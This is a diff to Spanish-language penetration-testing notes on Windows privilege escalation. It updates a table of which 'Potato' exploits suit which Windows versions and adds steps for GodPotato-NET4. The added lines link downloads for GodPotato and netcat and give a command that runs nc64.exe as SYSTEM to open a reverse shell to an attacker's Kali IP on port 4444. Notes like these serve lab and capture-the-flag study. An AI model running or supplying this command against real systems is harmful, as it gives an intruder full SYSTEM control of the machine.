@@ -125,8 +125,20 @@ IMPORTANTE --> CONOCER LA VERIÓN del SISTEMA OPERATIVO PARAA SABER QUE POTATO U
 Windows Server 2008 / 2008 R2	            JuicyPotato, RottenPotato
 Windows Server 2012 / 2012 R2	            JuicyPotato, RoguePotato, GodPotato
 Windows Server 2016 (<1809)	                JuicyPotato
-Windows Server 2019 / Windows 10 1809+	    PrintSpoofer, RoguePotato, GodPotato
-Windows Server 2022	                        GodPotato, SigmaPotato
+Windows Server 2019         	            PrintSpoofer, RoguePotato
+Windows 8/10/11 y Server 2012–2022	        GodPotato, SigmaPotato
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+# USAR GodPotato-NET4     <--- Mejor Opción
+
+PASOS con 'GodPotato-NET4' para ejecuta una Reverse Shell:
+# Descargar GodPotato-NET4.exe, Netcat y transferirlos a la máquina Windows en 'C:\Temp\'
+❯ https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
+❯ https://eternallybored.org/misc/netcat/
+
+❯ C:\Temp\GodPotato-NET4.exe -cmd "C:\Temp\nc64.exe IP_Kali 4444 -e cmd.exe"
+# Ejecutar un comando como nt authority \system para hacer una Reverse shell 
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
